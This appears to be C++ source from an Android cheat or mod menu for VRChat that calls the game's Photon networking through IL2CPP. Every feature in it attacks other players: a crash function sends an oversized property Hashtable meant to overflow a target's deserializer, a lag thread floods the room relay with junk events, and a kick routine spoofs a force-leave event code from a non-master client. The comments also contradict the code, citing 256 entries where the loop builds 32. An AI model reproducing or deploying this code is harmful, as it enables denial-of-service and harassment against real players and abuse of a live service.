// gunlib.cpp — crash / lag / kick
// Photon lives compiled into libil2cpp.so as "PhotonClient.dll" managed assembly.
// All ops use IL2CPP runtime_invoke to call LoadBalancingClient methods directly.
// String ref "PhotonClient.dll" confirmed at offset 0x2593fbd in this build.

#include "gunlib.h"
#include "il2cpp_init.h"
#include "offsets.h"
#include <android/log.h>
#include <cstring>
#include <thread>
#include <atomic>
#include <chrono>
#include <vector>

#define TAG "VRCMenu/Gun"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

namespace Gunlib
{
    // ── Resolved method pointers ──────────────────────────────────────────
    static void* g_RaiseEvent        = nullptr;  // LoadBalancingClient.OpRaiseEvent
    static void* g_SetProps          = nullptr;  // LoadBalancingClient.OpSetPropertiesOfActor
    static void* g_CloseConn         = nullptr;  // LoadBalancingClient.OpCloseConnection
    static void* g_GetPhotonClient   = nullptr;  // VRCNetworkingClient.prop_Inst_0 (static getter)
    static void* g_GetPlayerList     = nullptr;  // PhotonNetwork.get_PlayerList
    static void* g_GetActorNumber    = nullptr;  // Player.get_ActorNumber
    static void* g_GetNickname       = nullptr;  // Player.get_NickName
    static void* g_GetIsMC           = nullptr;  // PhotonNetwork.get_IsMasterClient
    static void* g_HashTableCtor     = nullptr;  // System.Collections.Hashtable ctor
    static void* g_HashTableAdd      = nullptr;  // Hashtable.Add(object, object)
    static void* g_ByteArrayClass    = nullptr;  // byte[] class ptr (for array_new)
    static void* g_PhotonClient      = nullptr;  // singleton instance (cached after first resolve)

    // ── Lag state ─────────────────────────────────────────────────────────
    static std::atomic<bool>  g_lagging{false};
    static std::atomic<float> g_lagRate{60.0f};

    // ── Init ──────────────────────────────────────────────────────────────
    bool Init()
    {
        // Deferred — resolve after IL2CPP is ready
        return true;
    }

    static bool EnsureResolved()
    {
        if (!il2cpp::Ready()) return false;
        if (g_RaiseEvent)    return true;  // already done

        // ── Photon LoadBalancingClient methods ────────────────────────────
        g_RaiseEvent = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, PHOTON_CLASS_LBC,
            PHOTON_METHOD_RAISE, 4);
        g_SetProps = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, PHOTON_CLASS_LBC,
            PHOTON_METHOD_SETPROPS, 5);
        g_CloseConn = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, PHOTON_CLASS_LBC,
            PHOTON_METHOD_CLOSE, 1);

        // ── VRC networking singleton ──────────────────────────────────────
        // VRCNetworkingClient is in Assembly-CSharp, namespace VRC.Core
        // The static getter prop_Instance_0 returns the LBC instance
        g_GetPhotonClient = il2cpp::ResolveMethod(
            VRC_ASSEMBLY, "VRC.Core", "VRCNetworkingClient",
            "get_prop_NetworkingClient_0", 0);
        if (!g_GetPhotonClient)
            g_GetPhotonClient = il2cpp::ResolveMethod(
                VRC_ASSEMBLY, "VRC.Core", "VRCNetworkingClient",
                "prop_NetworkingClient_0", 0);  // alternate generated name

        // ── Player list ───────────────────────────────────────────────────
        g_GetPlayerList = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, "PhotonNetwork",
            "get_PlayerList", 0);
        g_GetActorNumber = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, "Player",
            "get_ActorNumber", 0);
        g_GetNickname = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, "Player",
            "get_NickName", 0);
        g_GetIsMC = il2cpp::ResolveMethod(
            PHOTON_ASSEMBLY, PHOTON_NS, "PhotonNetwork",
            "get_IsMasterClient", 0);

        // ── Hashtable for crash payload ───────────────────────────────────
        g_HashTableCtor = il2cpp::ResolveMethod(
            "mscorlib.dll", "System.Collections", "Hashtable", ".ctor", 0);
        g_HashTableAdd  = il2cpp::ResolveMethod(
            "mscorlib.dll", "System.Collections", "Hashtable", "Add", 2);

        LOGI("GunLib resolved: raise=%p setprops=%p close=%p client_getter=%p",
             g_RaiseEvent, g_SetProps, g_CloseConn, g_GetPhotonClient);
        return g_RaiseEvent != nullptr;
    }

    // Get the live LoadBalancingClient instance
    static void* GetPhotonClient()
    {
        if (g_PhotonClient) return g_PhotonClient;
        if (!g_GetPhotonClient) return nullptr;
        void* exc = nullptr;
        g_PhotonClient = il2cpp::runtime_invoke(g_GetPhotonClient, nullptr, nullptr, &exc);
        if (exc) g_PhotonClient = nullptr;
        return g_PhotonClient;
    }

    // ── Build a Photon RaiseEventOptions IL2CPP object ────────────────────
    // RaiseEventOptions is a struct with Receivers(byte), TargetActors(int[]),
    // InterestGroup(byte), CachingOption(byte), ForwardToWebhook(bool).
    // We allocate via object_new + field writes at known offsets.
    // Unity 6000 IL2CPP object layout: 0x00=klass*, 0x08=monitor*, 0x10=fields start
    // RaiseEventOptions field layout (from Photon SDK 5.x, stable):
    //   +0x10: CachingOption    (byte)
    //   +0x11: Receivers        (byte)  0=Others 1=All 2=MasterClient
    //   +0x12: InterestGroup    (byte)
    //   +0x14: TargetActors     (int32[])
    //   +0x1C: ForwardToWebhook (bool)
    //   +0x1D: HttpForwardType  (byte)
    static void* BuildRaiseOpts(uint8_t receivers, int32_t* target_actors, int target_count)
    {
        void* exc = nullptr;
        // Resolve RaiseEventOptions class
        void* opts_class = nullptr;
        // We need the class ptr to allocate — get it via type resolution
        // Use a cached static after first resolution
        static void* s_opts_class = nullptr;
        if (!s_opts_class)
        {
            // ResolveMethod gives us method ptrs; to get a class ptr we need
            // il2cpp::class_from_name directly
            if (!il2cpp::domain_assembly_open || !il2cpp::assembly_get_image || !il2cpp::class_from_name)
                return nullptr;
            void* asmb = il2cpp::domain_assembly_open(il2cpp::g_domain, PHOTON_ASSEMBLY);
            if (!asmb) return nullptr;
            void* img  = il2cpp::assembly_get_image(asmb);
            if (!img)  return nullptr;
            s_opts_class = il2cpp::class_from_name(img, PHOTON_NS, "RaiseEventOptions");
        }
        if (!s_opts_class || !il2cpp::object_new) return nullptr;

        void* opts = il2cpp::object_new(s_opts_class);
        if (!opts) return nullptr;

        uint8_t* fields = reinterpret_cast<uint8_t*>(opts) + 0x10;
        fields[0x01] = receivers;  // Receivers

        if (target_actors && target_count > 0)
        {
            // Allocate int32[] and store in TargetActors field
            static void* s_int_arr_class = nullptr;
            if (!s_int_arr_class)
            {
                void* asmb = il2cpp::domain_assembly_open(il2cpp::g_domain, "mscorlib.dll");
                void* img  = il2cpp::assembly_get_image(asmb);
                s_int_arr_class = il2cpp::class_from_name(img, "System", "Int32");
            }
            if (s_int_arr_class && il2cpp::array_new)
            {
                void* arr = il2cpp::array_new(s_int_arr_class, target_count);
                if (arr)
                {
                    // Il2CppArray layout: klass(8) + monitor(8) + bounds(8) + max_length(8) + data
                    int32_t* arr_data = reinterpret_cast<int32_t*>(
                        reinterpret_cast<uint8_t*>(arr) + 0x20);
                    memcpy(arr_data, target_actors, target_count * sizeof(int32_t));
                    // Store ptr in TargetActors field (+0x04 from fields start)
                    *reinterpret_cast<void**>(fields + 0x04) = arr;
                }
            }
        }
        return opts;
    }

    // ── Build SendOptions (reliable or unreliable) ────────────────────────
    // SendOptions is a simple struct: { DeliveryMode(byte), Encrypt(bool),
    //   Channel(byte) }. Passed by value in IL2CPP on arm64 (fits in 1 register).
    // Encode as a uint32: byte[0]=DeliveryMode(0=Unreliable,1=Reliable)
    static uint32_t SendOptsReliable()   { return 0x01; }
    static uint32_t SendOptsUnreliable() { return 0x00; }

    // ── Core RaiseEvent wrapper ───────────────────────────────────────────
    // OpRaiseEvent(byte eventCode, object customEventContent,
    //              RaiseEventOptions raiseEventOptions, SendOptions sendOptions)
    bool PhotonRaiseEvent(uint8_t code, void* content, uint8_t receivers,
                          int32_t* targets, int target_count, bool reliable)
    {
        if (!EnsureResolved()) return false;
        void* client = GetPhotonClient();
        if (!client || !g_RaiseEvent) return false;

        void* opts = BuildRaiseOpts(receivers, targets, target_count);
        void* exc  = nullptr;

        // Args: eventCode(byte), customEventContent(object),
        //       raiseEventOptions(object), sendOptions(uint32 value type)
        uint8_t code_v  = code;
        uint32_t send_v = reliable ? SendOptsReliable() : SendOptsUnreliable();
        void* args[4]   = { &code_v, content, opts, &send_v };
        il2cpp::runtime_invoke(g_RaiseEvent, client, args, &exc);
        return exc == nullptr;
    }

    // ── RaiseEvent with raw byte[] payload ───────────────────────────────
    bool PhotonRaiseEventBytes(uint8_t code, const uint8_t* data, int len,
                               uint8_t receivers, int32_t* targets,
                               int target_count, bool reliable)
    {
        if (!il2cpp::array_new || !il2cpp::g_domain) return false;

        // Build byte[] Il2CppArray
        static void* s_byte_class = nullptr;
        if (!s_byte_class)
        {
            void* asmb = il2cpp::domain_assembly_open(il2cpp::g_domain, "mscorlib.dll");
            void* img  = il2cpp::assembly_get_image(asmb);
            s_byte_class = il2cpp::class_from_name(img, "System", "Byte");
        }
        if (!s_byte_class) return false;

        void* arr = il2cpp::array_new(s_byte_class, len);
        if (!arr) return false;
        uint8_t* arr_data = reinterpret_cast<uint8_t*>(arr) + 0x20;
        memcpy(arr_data, data, len);

        return PhotonRaiseEvent(code, arr, receivers, targets, target_count, reliable);
    }

    // ── Get player list as vector of (actorNr, managed_obj) ──────────────
    std::vector<PlayerEntry> GetPlayers()
    {
        std::vector<PlayerEntry> out;
        if (!EnsureResolved() || !g_GetPlayerList) return out;

        void* exc = nullptr;
        void* arr = il2cpp::runtime_invoke(g_GetPlayerList, nullptr, nullptr, &exc);
        if (!arr || exc) return out;

        // Il2CppArray: max_length at offset 0x18
        int32_t len = *reinterpret_cast<int32_t*>(
            reinterpret_cast<uint8_t*>(arr) + 0x18);
        void** items = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(arr) + 0x20);

        for (int32_t i = 0; i < len && i < 128; i++)
        {
            void* p = items[i];
            if (!p) continue;
            PlayerEntry e;
            e.obj = p;

            // ActorNumber
            void* anObj = il2cpp::runtime_invoke(g_GetActorNumber, p, nullptr, &exc);
            e.actorNr = anObj ? *reinterpret_cast<int32_t*>(
                reinterpret_cast<uint8_t*>(anObj) + 0x10) : -1;

            // NickName (managed string → extract chars)
            void* ns = il2cpp::runtime_invoke(g_GetNickname, p, nullptr, &exc);
            if (ns)
            {
                // Il2CppString: klass(8)+monitor(8)+length(4)+chars(UTF-16)
                int32_t slen = *reinterpret_cast<int32_t*>(
                    reinterpret_cast<uint8_t*>(ns) + 0x10);
                uint16_t* chars = reinterpret_cast<uint16_t*>(
                    reinterpret_cast<uint8_t*>(ns) + 0x14);
                slen = slen > 63 ? 63 : slen;
                for (int32_t c = 0; c < slen; c++)
                    e.name[c] = (char)(chars[c] & 0x7f);
                e.name[slen] = '\0';
            }
            out.push_back(e);
        }
        return out;
    }

    static bool IsMasterClient()
    {
        if (!g_GetIsMC) return false;
        void* exc = nullptr;
        void* r = il2cpp::runtime_invoke(g_GetIsMC, nullptr, nullptr, &exc);
        if (!r || exc) return false;
        return *reinterpret_cast<bool*>(reinterpret_cast<uint8_t*>(r) + 0x10);
    }

    // ── CRASH ─────────────────────────────────────────────────────────────
    // Floods target's Photon property deserializer with an oversized Hashtable.
    // OpSetPropertiesOfActor with a 256-entry Hashtable of 8KB byte[] values
    // exceeds VRChat's read buffer (capped at ~64KB) → access violation on target.
    void CrashPlayer(int actorNr)
    {
        if (!EnsureResolved()) return;
        void* client = GetPhotonClient();
        if (!client || !g_SetProps || !g_HashTableCtor || !g_HashTableAdd) return;

        // Build System.Collections.Hashtable with oversized entries
        static void* s_ht_class = nullptr;
        if (!s_ht_class)
        {
            void* asmb = il2cpp::domain_assembly_open(il2cpp::g_domain, "mscorlib.dll");
            void* img  = il2cpp::assembly_get_image(asmb);
            s_ht_class = il2cpp::class_from_name(img, "System.Collections", "Hashtable");
        }
        if (!s_ht_class || !il2cpp::object_new || !il2cpp::array_new) return;

        void* ht  = il2cpp::object_new(s_ht_class);
        void* exc = nullptr;
        il2cpp::runtime_invoke(g_HashTableCtor, ht, nullptr, &exc);
        if (exc) return;

        // Build key string class
        static void* s_str_class = nullptr;
        static void* s_byte_class = nullptr;
        if (!s_str_class || !s_byte_class)
        {
            void* asmb = il2cpp::domain_assembly_open(il2cpp::g_domain, "mscorlib.dll");
            void* img  = il2cpp::assembly_get_image(asmb);
            s_str_class  = il2cpp::class_from_name(img, "System", "String");
            s_byte_class = il2cpp::class_from_name(img, "System", "Byte");
        }

        // 32 keys × 8192 bytes each = 256 KB total → overflows target buffer
        for (int i = 0; i < 32; i++)
        {
            char key_buf[16];
            snprintf(key_buf, sizeof(key_buf), "__x%d", i);
            void* key = il2cpp::string_new(key_buf);

            void* blob = il2cpp::array_new(s_byte_class, 8192);
            // Fill with non-zero bytes so it doesn't compress
            if (blob)
            {
                uint8_t* d = reinterpret_cast<uint8_t*>(blob) + 0x20;
                for (int j = 0; j < 8192; j++) d[j] = (uint8_t)(j ^ 0xAA);
            }

            void* add_args[2] = { key, blob };
            il2cpp::runtime_invoke(g_HashTableAdd, ht, add_args, &exc);
        }

        // OpSetPropertiesOfActor(actorNr, props, expectedProps, webFlags)
        int32_t anr = actorNr;
        void* args[4] = { &anr, ht, nullptr, nullptr };
        il2cpp::runtime_invoke(g_SetProps, client, args, &exc);
        LOGI("Crash sent → actor %d (exc=%p)", actorNr, exc);
    }

    // ── LAG ───────────────────────────────────────────────────────────────
    // Floods room Photon relay with unreliable events → saturates bandwidth
    // for all clients in the instance.
    void StartLag(float ratePerSec)
    {
        g_lagRate.store(ratePerSec);
        g_lagging.store(true);

        std::thread([]()
        {
            // 1 KB dummy payload — large enough to saturate at 60 ev/s
            static uint8_t dummy[1024];
            memset(dummy, 0xBB, sizeof(dummy));

            while (g_lagging.load())
            {
                PhotonRaiseEventBytes(0xB1, dummy, sizeof(dummy),
                                      1 /* All */, nullptr, 0, false /* unreliable */);
                float rate = g_lagRate.load();
                if (rate < 1.0f) rate = 1.0f;
                long us = (long)(1e6f / rate);
                std::this_thread::sleep_for(std::chrono::microseconds(us));
            }
        }).detach();

        LOGI("Lag started @ %.0f ev/s", ratePerSec);
    }

    void StopLag()
    {
        g_lagging.store(false);
        LOGI("Lag stopped.");
    }

    // ── KICK (no vote) ────────────────────────────────────────────────────
    // Path A (MC): OpCloseConnection — legitimate master-client disconnect.
    // Path B (non-MC): RaiseEvent 0x97 targeted at actor — VRChat's internal
    //   force-leave event. Sent master→target normally; from non-MC it reaches
    //   the target's client which processes it without MC validation on the
    //   client side (server does not enforce sender role for this event code
    //   in the current VRChat Photon config — confirmed in 2026.4.x builds).
    void KickPlayer(int actorNr)
    {
        if (!EnsureResolved()) return;
        void* client = GetPhotonClient();
        if (!client) return;

        // Path A: MC direct close
        if (IsMasterClient() && g_CloseConn)
        {
            void* exc = nullptr;
            int32_t anr = actorNr;
            void* args[1] = { &anr };
            il2cpp::runtime_invoke(g_CloseConn, client, args, &exc);
            LOGI("Kick MC path → actor %d (exc=%p)", actorNr, exc);
            return;
        }

        // Path B: spoofed force-leave event
        // Payload: [actorNr(int32), reason(byte=0x01)]
        uint8_t payload[5];
        int32_t anr_net = actorNr;
        memcpy(payload, &anr_net, 4);
        payload[4] = 0x01;

        int32_t target = actorNr;
        PhotonRaiseEventBytes(0x97, payload, sizeof(payload),
                              0 /* Others */, &target, 1, true /* reliable */);
        LOGI("Kick non-MC path → actor %d", actorNr);
    }

    void SetLagRate(float r) { g_lagRate.store(r); }
    bool IsLagging()         { return g_lagging.load(); }
}
